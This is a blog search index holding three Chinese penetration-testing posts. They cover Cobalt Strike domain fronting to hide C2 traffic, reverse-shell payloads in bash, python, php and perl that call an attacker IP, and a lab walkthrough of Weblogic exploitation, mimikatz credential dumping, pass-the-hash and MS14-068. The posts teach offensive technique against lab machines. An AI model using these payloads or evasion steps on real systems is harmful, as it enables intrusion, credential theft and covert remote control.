<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CS流量隐藏-域前置技术</title>
    <url>/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/</url>
    <content><![CDATA[<h2 id="什么是域前置"><a href="#什么是域前置" class="headerlink" title="什么是域前置"></a>什么是域前置</h2><p>Domain Fronting，中文译名 “域前置” 或 “域名前置”，是一种用于隐藏真实C2(Command and Control)服务器IP且同时能伪装为与高信誉域名通信的技术，多用于木马受控端和控制端之间的隐蔽通信。</p>
<p>利用该技术，可以让受控端以为程序是在和一个高信誉域名通信，但实际上却是在和我们的C2服务器进行通信</p>
<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><h3 id="域控制器"><a href="#域控制器" class="headerlink" title="域控制器"></a>域控制器</h3><p>Windows Server 2008 R2: 192.168.184.132（NAT）</p>
<p>域名：wcl078.shiyan078</p>
<p>用户名：administrator</p>
<p>密码：123456@abc</p>
<h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/image-20220509095907956.png" alt="image-20220509095907956"></p>
<p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/image-20220509095956218.png" alt="image-20220509095956218"></p>
<p>继续安装AD配置域名为wcl078.shiyan078</p>
<p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/image-20220509100037635.png" alt="image-20220509100037635"></p>
<p>创建一个域用户wcl078，密码使123456@abc</p>
<p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/clip_image002.jpg" alt="img"></p>
<h3 id="域成员服务器"><a href="#域成员服务器" class="headerlink" title="域成员服务器"></a>域成员服务器</h3><p>Windows7: 192.168.184.153（NAT）</p>
<p>域名：wcl078.shiyan078</p>
<p>用户名：wcl078</p>
<p>密码：123456@abc</p>
<h3 id="CS服务端"><a href="#CS服务端" class="headerlink" title="CS服务端"></a>CS服务端</h3><p>Ubuntu:（公网ip）</p>
<p>安装jdk8</p>
<p>apt install openjdk-8-jre-headless</p>
<h3 id="CS客户端"><a href="#CS客户端" class="headerlink" title="CS客户端"></a>CS客户端</h3><p>kali: 192.168.3.78 (桥接模式，不能是NAT，不然之后用wireshark抓取流量的时候会抓到CS客户端与服务端通信的流量，因为wireshark抓的是网卡的流量，别问我为什么知道QAQ)</p>
<p>更换JDK</p>
<p>由于我的kali自带jdk11需要更换为jdk8</p>
<p>访问<a href="https://www.oracle.com/java/technologies/downloads/#java8%EF%BC%8C%E4%B8%8B%E8%BD%BDjdk8">https://www.oracle.com/java/technologies/downloads/#java8，下载jdk8</a></p>
<p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/clip_image002-1652061818255.jpg" alt="img"></p>
<p>下载后将该压缩包放到kali虚拟机中，执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 解压压缩包</span></span><br><span class="line">tar zxvf jdk-8u331-linux-x64.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将解压后的文件移动到/opt目录下</span></span><br><span class="line">mv ./jdk1.8.0_251/ /opt/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后使用update-alternatives命令进行安装</span></span><br><span class="line">update-alternatives --install /usr/bin/java java /opt/jdk1.8.0_331/bin/java 1</span><br><span class="line"></span><br><span class="line">update-alternatives --install /usr/bin/javac javac /opt/jdk1.8.0_331/bin/javac 1</span><br><span class="line"></span><br><span class="line">update-alternatives --<span class="built_in">set</span> java /opt/jdk1.8.0_331/bin/java</span><br><span class="line"></span><br><span class="line">update-alternatives --<span class="built_in">set</span> javac /opt/jdk1.8.0_331/bin/javac</span><br></pre></td></tr></table></figure>

<p>最后使用<code>java -version</code>查看版本，更换成功</p>
<p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/clip_image002-1652062807196.jpg" alt="img"></p>
<p>补充：若之后想切换回jdk11，执行<code>update-alternatives --config java</code>来选择切换</p>
<p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/clip_image002-1652062821709.jpg" alt="img"></p>
<h2 id="CS实现域前置"><a href="#CS实现域前置" class="headerlink" title="CS实现域前置"></a>CS实现域前置</h2><p>需要一个域名和CND，这里我是在某云注册的域名和CDN</p>
<p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/clip_image002-1652065755641.jpg" alt="img"></p>
<p>这里使用站长之家的多地ping来看CDN是否生效<a href="http://ping.chinaz.com/%EF%BC%8C%E6%9C%89%E4%B8%8D%E5%90%8Cip%E5%8D%B3%E5%8F%AF">http://ping.chinaz.com/，有不同ip即可</a></p>
<p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/clip_image002-1652065770486.jpg" alt="img"></p>
<p>服务端cs在运行时需要加一个.profile文件，我是基于<a href="https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/normal/amazon.profile">amazon.profile</a>文件的基础上改了两个地方，将Host改为我的域名</p>
<p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/clip_image002-1652065963543.jpg" alt="img"></p>
<p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/clip_image002-1652065967848.jpg" alt="img"></p>
<p>改好后重新运行teamserver，<code>/teamserver vpsip mima amazon.profile</code></p>
<p>之后kali客户端连接，配置监听器</p>
<p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/clip_image001.png" alt="img"></p>
<p>再利用cs生成攻击命令</p>
<p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/clip_image002-1652066019120.jpg" alt="img"></p>
<p>然后在受害主机win7的cmd中执行刚刚生成攻击命令,之后CS上线</p>
<p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/clip_image002-1652066172741.jpg" alt="img"></p>
<p>在weblog中查看结果如下</p>
<p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/clip_image002-1652066202884.jpg" alt="img"></p>
<p>在受害主机win7上使用wireshark抓包分析，过滤出ip为vpsip的，发现并没有流量，说明域前置隐藏成功</p>
<p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/clip_image002-1652066215882.jpg" alt="img"></p>
<p>还可以在cmd中执行netstat查看建立的连接，并不是和我的vps建立的，也能说明CDN生效了</p>
<p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/clip_image002-1652066228717.jpg" alt="img"></p>
<p>到此域前置到此部署完毕</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.freebuf.com/articles/network/276159.html">域前置攻击复现</a></p>
<p><a href="https://www.anquanke.com/post/id/195011">基于国内某云的 Domain Fronting 技术实践</a></p>
<p><a href="https://blog.csdn.net/qq_43968080/article/details/105586109">Kali重新安装JAVA环境</a></p>
<p><a href="https://blog.csdn.net/userpass_word/article/details/103838606">Kali中安装Java环境</a></p>
<h2 id="拓展了解"><a href="#拓展了解" class="headerlink" title="拓展了解"></a>拓展了解</h2><p><a href="https://www.freebuf.com/articles/web/271046.html">域前置之“中外差异”</a></p>
]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>域前置技术</tag>
        <tag>Cobaltstrike</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux反弹shell</title>
    <url>/2022/03/27/Linux%E5%8F%8D%E5%BC%B9shell/</url>
    <content><![CDATA[<h2 id="文件描述符"><a href="#文件描述符" class="headerlink" title="文件描述符"></a>文件描述符</h2><p><img src="/2022/03/27/Linux%E5%8F%8D%E5%BC%B9shell/image-20220327173708545.png" alt="image-20220327173708545"></p>
<table>
<thead>
<tr>
<th align="center">编号</th>
<th align="center">文件描述符</th>
<th align="center">含义</th>
<th align="center">默认链接</th>
<th align="center">用法</th>
</tr>
</thead>
<tbody><tr>
<td align="center">0</td>
<td align="center">stdin</td>
<td align="center">标准输入</td>
<td align="center">键盘</td>
<td align="center">仅读取</td>
</tr>
<tr>
<td align="center">1</td>
<td align="center">stdout</td>
<td align="center">标准输出</td>
<td align="center">终端</td>
<td align="center">仅写入</td>
</tr>
<tr>
<td align="center">2</td>
<td align="center">stderr</td>
<td align="center">标准错误输出</td>
<td align="center">终端</td>
<td align="center">仅写入</td>
</tr>
<tr>
<td align="center">3+</td>
<td align="center">filename</td>
<td align="center">其他文件</td>
<td align="center">无</td>
<td align="center">读取/写入</td>
</tr>
</tbody></table>
<h2 id="输入-输出重定向"><a href="#输入-输出重定向" class="headerlink" title="输入/输出重定向"></a>输入/输出重定向</h2><p><img src="/2022/03/27/Linux%E5%8F%8D%E5%BC%B9shell/%E9%87%8D%E5%AE%9A%E5%90%91%E7%AC%A6.png" alt="重定向符"></p>
<h3 id="gt-fille"><a href="#gt-fille" class="headerlink" title="&gt; fille"></a>&gt; fille</h3><blockquote>
<p>&gt; 相当于 1&gt;</p>
</blockquote>
<p><img src="/2022/03/27/Linux%E5%8F%8D%E5%BC%B9shell/image-20220327181811794.png" alt="image-20220327181811794"></p>
<p>但<code>&gt;</code>符号有点危险，因为会覆盖文件原有内容</p>
<h3 id="gt-gt-file"><a href="#gt-gt-file" class="headerlink" title="&gt;&gt; file"></a>&gt;&gt; file</h3><p><code>&gt;&gt;</code>就比<code>&gt;</code>安全，<code>&gt;&gt;</code>是在文件后追加</p>
<h3 id="2-gt-file"><a href="#2-gt-file" class="headerlink" title="2&gt; file"></a>2&gt; file</h3><p>会将错误的输出重定向到指定文件</p>
<p><img src="/2022/03/27/Linux%E5%8F%8D%E5%BC%B9shell/image-20220327182227217.png" alt="image-20220327182227217"></p>
<h3 id="2-gt-dev-null"><a href="#2-gt-dev-null" class="headerlink" title="2&gt; dev/null"></a>2&gt; dev/null</h3><p><code>/dev/null</code>类似垃圾桶，输入到该文件下的内容都会被丢弃</p>
<p><img src="/2022/03/27/Linux%E5%8F%8D%E5%BC%B9shell/image-20220327182105251.png" alt="image-20220327182105251"></p>
<h3 id="gt-file-2-gt-amp-1-和-amp-gt-file"><a href="#gt-file-2-gt-amp-1-和-amp-gt-file" class="headerlink" title="&gt; file 2&gt;&amp;1 和 &amp;&gt; file"></a>&gt; file 2&gt;&amp;1 和 &amp;&gt; file</h3><p><code>&gt; file 2&gt;&amp;1</code>和<code>&amp;&gt; file</code>和<code>&gt;&amp; file</code>都是一个意思，将<strong>stdout</strong>和<strong>stderr</strong>都重定向到<strong>file</strong>中</p>
<p><code>&gt;&amp;1</code>中的&amp;符号是将后面的数字解析成文件描述符的意思，如果不加<code>&amp;</code>符号，系统将会把后面的当成一个数字作为文件名的文件</p>
<h3 id="lt-file"><a href="#lt-file" class="headerlink" title="&lt; file"></a>&lt; file</h3><p>表示的是输入重定向，就是把&lt;后面跟的文件取代键盘作为新的输入设备。</p>
<h2 id="什么是反弹shell"><a href="#什么是反弹shell" class="headerlink" title="什么是反弹shell"></a>什么是反弹shell</h2><p>reverse shell，就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。</p>
<h2 id="为什么要反弹shell"><a href="#为什么要反弹shell" class="headerlink" title="为什么要反弹shell"></a>为什么要反弹shell</h2><p>通常用于被控端因防火墙受限、权限不足、端口被占用等情形</p>
<p>假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面，web服务，ssh，telnet等等，都是正向连接。那么什么情况下正向连接不太好用了呢？</p>
<ol>
<li><p>某客户机中了你的网马，但是它在局域网内，你直接连接不了。</p>
</li>
<li><p>它的ip会动态改变，你不能持续控制。</p>
</li>
<li><p>由于防火墙等限制，对方机器只能发送请求，不能接收请求。</p>
</li>
<li><p>对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知，所以建立一个服务端，让恶意程序主动连接，才是上策。</p>
</li>
</ol>
<p>那么反弹就很好理解了， 攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。</p>
<h2 id="反弹shell的paylaod"><a href="#反弹shell的paylaod" class="headerlink" title="反弹shell的paylaod"></a>反弹shell的paylaod</h2><blockquote>
<p>bash -i 产生交互式shell</p>
<p>bash -c 是为了确保命令使用bash shell来执行，若默认shell就是bash那就没有区别</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -c <span class="string">&quot;bash -i &lt; /dev/tcp/ip/port 1&lt;&amp;0 2&lt;&amp;0&quot;</span> <span class="comment"># n&lt; 这里n省略就是标准输入</span></span><br><span class="line"></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">bash  -i &gt; /dev/tcp/ip/port 0&lt;&amp;1 2&gt;&amp;1 <span class="comment"># 这里的0可以不写</span></span><br></pre></td></tr></table></figure>

<h2 id="拓展反弹shell命令"><a href="#拓展反弹shell命令" class="headerlink" title="拓展反弹shell命令"></a>拓展反弹shell命令</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> python</span></span><br><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.184.128&quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> bash</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.184.128/4444 0&gt;&amp;1</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> php</span></span><br><span class="line">php -r &#x27;$sock=fsockopen(&quot;192.168.184.128&quot;,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br><span class="line"><span class="meta">#</span><span class="bash"> 这里的描述符3解释一下：程序刚刚启动的时候，0是标准输入，1是标准输出，2是标准错误。如果此时去打开一个新的文件，它的文件描述符会是3，所以fsockopen(<span class="string">&quot;192.168.184.128&quot;</span>,4444)就是描述符3</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> perl</span></span><br><span class="line">perl -e &#x27;use Socket;$i=&quot;192.168.184.128&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;; &#x27;</span><br></pre></td></tr></table></figure>



<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.runoob.com/linux/linux-shell-io-redirections.html">Shell 输入/输出重定向 | 菜鸟教程</a></p>
<p><a href="https://xz.aliyun.com/t/2548">Linux反弹shell（一）文件描述符与重定向 - 先知社区</a></p>
<p><a href="https://xz.aliyun.com/t/2549">Linux 反弹shell（二）反弹shell的本质 - 先知社区</a></p>
<p><a href="https://www.bilibili.com/video/BV1th411o7Ub?spm_id_from=333.337.search-card.all.click">文件重定向和管道符_哔哩哔哩_bilibili</a></p>
<p><a href="http://www.xckey.com/971.html">Linux中的bash -c 的使用详解</a></p>
<p><a href="https://baijiahao.baidu.com/s?id=1659479624291885631&wfr=spider&for=pc">文件描述符终极使用</a></p>
]]></content>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnstack2靶场内网渗透</title>
    <url>/2022/04/24/Vulnstack2%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>本次红队环境主要Access Token利用、WMI利用、域漏洞利用SMB relay，EWS relay，PTT(PTC)，MS14-068，GPP，SPN利用、黄金票据/白银票据/Sid History/MOF等攻防技术。<strong>关于靶场统一登录密码：1qaz@WSX</strong></p>
<ol>
<li>Bypass UAC</li>
<li>Windows系统NTLM获取（理论知识：Windows认证）</li>
<li>Access Token利用（MSSQL利用）</li>
<li>WMI利用</li>
<li>网页代理，二层代理，特殊协议代理（DNS，ICMP）</li>
<li>域内信息收集</li>
<li>域漏洞利用：SMB relay，EWS relay，PTT(PTC)，MS14-068，GPP，SPN利用</li>
<li>域凭证收集</li>
<li>后门技术（黄金票据/白银票据/Sid History/MOF）</li>
</ol>
<h4 id="环境说明"><a href="#环境说明" class="headerlink" title="环境说明"></a>环境说明</h4><p>内网网段：10.10.10.1/24</p>
<p>防火墙策略（策略设置过后，测试机只能访问192段地址，模拟公网访问）：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute"><span class="nomarkup">deny</span></span> <span class="literal">all</span> tcp ports：<span class="number">10.10.10.1</span></span><br><span class="line"><span class="attribute"><span class="nomarkup">allow</span></span> <span class="literal">all</span> tcp ports：<span class="number">10.10.10.0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>

<h4 id="配置信息"><a href="#配置信息" class="headerlink" title="配置信息"></a>配置信息</h4><p><strong>DC</strong></p>
<p>IP：10.10.10.10</p>
<p>OS：Windows 2012(64)</p>
<p>应用：AD域</p>
<p><strong>WEB</strong></p>
<p>IP1：10.10.10.80</p>
<p>IP2：192.168.184.151</p>
<p><img src="/2022/04/24/Vulnstack2%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220424205326863.png" alt="image-20220424205326863"></p>
<p>OS：Windows 2008(64)</p>
<p>应用：Weblogic 10.3.6MSSQL 2008</p>
<p>注意：刚打开虚拟机时，需要恢复到快照V1.3，使用WEB\de1ay账户登录修改密码为123456@abc，登录后在<code>C:\Oracle\Middleware\user_projects\domains\base_domain\bin</code>目录点击<code>startWebLogic</code>下开启weblogic服务</p>
<p><strong>PC</strong></p>
<p>IP1：10.10.10.201</p>
<p>IP2：192.168.184.152</p>
<p>OS：Windows 7(32)</p>
<p>应用：无</p>
<p><strong>攻击机</strong></p>
<p>IP：192.168.184.128</p>
<p>OS：kali</p>
<h2 id="外网渗透"><a href="#外网渗透" class="headerlink" title="外网渗透"></a>外网渗透</h2><p>首先信息收集，利用nmap扫描</p>
<p><code>nmap 192.168.184.0/24</code>，发现192.168.184.151是目标主机</p>
<p><img src="/2022/04/24/Vulnstack2%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220424233339890.png" alt="image-20220424233339890"></p>
<p>针对该目标进一步详细扫描<code>nmap -sV -Pn 192.168.184.151 -p1-65535</code></p>
<p>发现在7001端口开放了weblogic服务</p>
<p><img src="/2022/04/24/Vulnstack2%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220424233517838.png" alt="image-20220424233517838"></p>
<p>到github下载<a href="https://github.com/rabbitmask/WeblogicScan">WeblogicScan</a>脚本来对目标主机进行漏洞检验（注意这里需要使用python3），检测存在<strong>CVE-2019-2725</strong></p>
<p><img src="/2022/04/24/Vulnstack2%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220425001513764.png" alt="image-20220425001513764"></p>
<p>利用msf来getshell</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">search</span> CVE-<span class="number">2019</span>-<span class="number">2725</span></span><br><span class="line"><span class="attribute">use</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/24/Vulnstack2%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220425202132538.png" alt="image-20220425202132538"></p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> RHOSTS <span class="comment">192.168.184.151</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">RPORT 7001</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">LHOST 192.168.184.128</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">target 1</span></span><br><span class="line">show <span class="comment">options</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/24/Vulnstack2%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220425202602002.png" alt="image-20220425202602002"></p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">run</span></span><br></pre></td></tr></table></figure>

<p>得到会话</p>
<p><img src="/2022/04/24/Vulnstack2%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220425202711409.png" alt="image-20220425202711409"></p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">systeminfo</span></span><br></pre></td></tr></table></figure>

<p>操作系统：win server 2008 r2</p>
<p>主机名：WEB</p>
<p>打补丁：[01]: KB2999226<br>              [02]: KB958488<br>              [03]: KB976902</p>
<p><img src="/2022/04/24/Vulnstack2%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220425203639678.png" alt="image-20220425203639678"></p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">ipconfig /<span class="keyword">all</span></span><br></pre></td></tr></table></figure>

<p>有两张网卡</p>
<p>10.10.10.80是内网网卡</p>
<p>192.168.184.151是可出网的网卡</p>
<p><img src="/2022/04/24/Vulnstack2%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220425203116008.png" alt="image-20220425203116008"></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">net user <span class="regexp">//</span> 查看本地用户</span><br><span class="line">net localgroup administrators <span class="regexp">//</span> 查看本地管理员组</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/24/Vulnstack2%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220425204236387.png" alt="image-20220425204236387"></p>
<p>由于我们目前拿到的是一个本地用户，并不是域用户，所以没办法对域内信息进行收集，而且我们本地用户的权限也比较低</p>
<p>所以我把MSF委派给CS（便于后续的提权等相关操作）操作如下</p>
<p>现在CS端创建一个普通的监听</p>
<p><img src="/2022/04/24/Vulnstack2%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220425212747693.png" alt="image-20220425212747693"></p>
<p>之后通过msf的<code>exploit/windows/local/payload_inject</code>模块将session传给CS</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">use exploit/windows/local/payload_inject</span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> payload <span class="comment">windows</span>/meterpreter/<span class="comment">reverse_http</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> <span class="comment">lport [</span>端口号<span class="comment">]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> <span class="comment">lhost [MSF</span>的<span class="comment">IP]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> <span class="comment">session [session</span>的<span class="comment">id]</span></span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>委派成功</p>
<p><img src="/2022/04/24/Vulnstack2%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220425213013606.png" alt="image-20220425213013606"></p>
<p>接下来我们利用CS上的mimikatz来进行进一步信息收集，但mimikatz一般都需要system权限，所以我们还得先提权</p>
<p>使用CS中<a href="https://github.com/pandasec888/taowu-cobalt-strike">梼杌</a>-&gt;权限提升-&gt;MS15-051来进行提权</p>
<p>提权成功</p>
<p><img src="/2022/04/24/Vulnstack2%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220425213936834.png" alt="image-20220425213936834"></p>
<p>接下来就可以使用mimikatz了</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="meta"># 读取密码</span></span><br><span class="line">mimikatz sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>

<p>读出本机WEB域下用户<strong>de1ay</strong>的密码<strong>123456@abc</strong></p>
<p><img src="/2022/04/24/Vulnstack2%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220425214948274.png" alt="image-20220425214948274"></p>
<p>还收集到登录过DC主机的<strong>域内</strong>(<strong>DE1AY</strong>)用户<strong>mssql</strong>的密码<strong>1qaz@WSX</strong></p>
<p><img src="/2022/04/24/Vulnstack2%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220426003353266.png" alt="image-20220426003353266"></p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># 查看域用户</span><br><span class="line">shell <span class="built_in">net</span> user /domain</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/24/Vulnstack2%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220427132354442.png" alt="image-20220427132354442"></p>
<p>同时上图还显示了<code>DC.de1ay.com</code>，说明域控主机名是<code>DC</code>，域名是<code>de1ay.com</code></p>
<h2 id="获取域控"><a href="#获取域控" class="headerlink" title="获取域控"></a>获取域控</h2><h3 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h3><p>通过收集到了域用户名(<strong>administrator</strong>)+收集到的哈希(<strong>161cff084477fe596a5db81874498a24</strong>)利用psexec进行对域控主机进行连接</p>
<p><img src="/2022/04/24/Vulnstack2%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220427132855923.png" alt="image-20220427132855923"></p>
<p><img src="/2022/04/24/Vulnstack2%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220427132949382.png" alt="image-20220427132949382"></p>
<p>成功获取域控主机的SYSTEM权限，最终目标达成</p>
<p><img src="/2022/04/24/Vulnstack2%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220427133104694.png" alt="image-20220427133104694"></p>
<h3 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h3><p>参考：<a href="https://henshinhacks.blogspot.com/2015/02/windows-server-dc-ms14-068-vulnerability.html">https://henshinhacks.blogspot.com/2015/02/windows-server-dc-ms14-068-vulnerability.html</a></p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">MS14-<span class="number">068</span>.exe -u de1ay@de1ay.com -p <span class="number">1</span>qaz@WSX -s S-<span class="number">1</span>-<span class="number">5</span>-<span class="number">21</span>-<span class="number">2756371121</span>-<span class="number">2868759905</span>-<span class="number">3853650604</span>-<span class="number">1001</span> -d DC</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/24/Vulnstack2%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220428195556926.png" alt="image-20220428195556926"></p>
